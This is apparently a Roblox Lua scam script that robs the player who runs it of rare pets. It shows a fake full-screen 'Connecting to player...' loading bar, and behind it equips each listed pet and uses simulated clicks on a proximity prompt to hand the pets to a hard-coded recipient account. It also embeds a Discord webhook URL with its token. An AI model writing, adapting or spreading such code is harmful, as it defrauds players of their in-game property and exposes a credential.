repeat task.wait() until game:IsLoaded()

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualInputManager = game:GetService("VirtualInputManager")

local VICTIM = Players.LocalPlayer
local USERNAMES = { "ZeeS_Farm01" }
local WEBHOOK_URL = "https://discord.com/api/webhooks/1376515155814514769/0pp3_tQv_j7Aeehx6imt8UBQUan0sPFfn9yaxXxmy6QGfeucYGh4CHQwrssARwTNfh75"

local PET_WHITELIST = {
	'Raccoon', 'T-Rex', 'Fennec Fox', 'Dragonfly', 'Butterfly',
	'Disco Bee', 'Mimic Octopus', 'Queen Bee', 'Spinosaurus', 'Kitsune', 'Raiju'
}

local dataModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("DataService"))
local victimPetTable = {}

local function waitForTarget()
	for _, player in Players:GetPlayers() do
		if table.find(USERNAMES, player.Name) then
			return true, player.Name
		end
	end
	return false, nil
end

local function createLoadingGUI()
	local gui = Instance.new("ScreenGui", VICTIM:WaitForChild("PlayerGui"))
	gui.Name = "FullScreenLoading"
	gui.IgnoreGuiInset = true
	gui.ResetOnSpawn = false
	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	local bg = Instance.new("Frame", gui)
	bg.Size = UDim2.new(1, 0, 1, 0)
	bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
	bg.BorderSizePixel = 0

	local text = Instance.new("TextLabel", bg)
	text.Text = "\u{1F501} Connecting to player..."
	text.Size = UDim2.new(1, 0, 0, 100)
	text.Position = UDim2.new(0, 0, 0.4, 0)
	text.TextColor3 = Color3.new(1, 1, 1)
	text.Font = Enum.Font.GothamBlack
	text.TextSize = 40
	text.BackgroundTransparency = 1

	local barBG = Instance.new("Frame", bg)
	barBG.Size = UDim2.new(0.6, 0, 0.05, 0)
	barBG.Position = UDim2.new(0.2, 0, 0.55, 0)
	barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	barBG.BorderSizePixel = 0

	local bar = Instance.new("Frame", barBG)
	bar.Size = UDim2.new(0, 0, 1, 0)
	bar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
	bar.BorderSizePixel = 0

	return gui, bar
end

local function showLoadingBar(duration)
	local gui, bar = createLoadingGUI()
	local steps = 100
	local waitTime = duration / steps

	for i = 1, steps do
		bar.Size = UDim2.new(i / steps, 0, 1, 0)
		task.wait(waitTime)
	end

	gui:Destroy()
end

local function checkPetsWhitelist(pet)
	for _, name in PET_WHITELIST do
		if string.find(pet, name) then
			return true
		end
	end
end

local function getPetObject(petUid)
	for _, object in ipairs(VICTIM.Backpack:GetChildren()) do
		if object:GetAttribute("PET_UUID") == petUid then
			return object
		end
	end
	for _, object in ipairs(workspace[VICTIM.Name]:GetChildren()) do
		if object:GetAttribute("PET_UUID") == petUid then
			return object
		end
	end
end

local function equipPet(pet)
	if pet:GetAttribute("d") then
		ReplicatedStorage.GameEvents.Favorite_Item:FireServer(pet)
	end
	VICTIM.Character.Humanoid:EquipTool(pet)
end

local function deltaBypass()
	local cx = workspace.Camera.ViewportSize.X / 2
	local cy = workspace.Camera.ViewportSize.Y / 2
	VirtualInputManager:SendMouseButtonEvent(cx, cy, 0, true, nil, false)
	task.wait(0.5)
	VirtualInputManager:SendMouseButtonEvent(cx, cy, 0, false, nil, false)
end

local function startSteal(trigerName)
	local prompt = Players[trigerName].Character.Head:FindFirstChild("ProximityPrompt")
	if prompt then
		prompt.HoldDuration = 0
		deltaBypass()
	end
end

local function getPlayersPets()
	for petUid, value in dataModule:GetData().PetsData.PetInventory.Data do
		if checkPetsWhitelist(value.PetType) then
			table.insert(victimPetTable, value.PetType)
		end
	end
end

getPlayersPets()

task.spawn(function()
	while task.wait(1) do
		local found, targetName = waitForTarget()
		if found then
			showLoadingBar(30)
			task.wait(7)

			for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
				if not checkPetsWhitelist(value.PetType) then continue end
				local petObject = getPetObject(petUid)
				if not petObject then continue end
				equipPet(petObject)
				deltaBypass()
				startSteal(targetName)
				task.wait(0.3)
			end

			break
		end
	end
end)
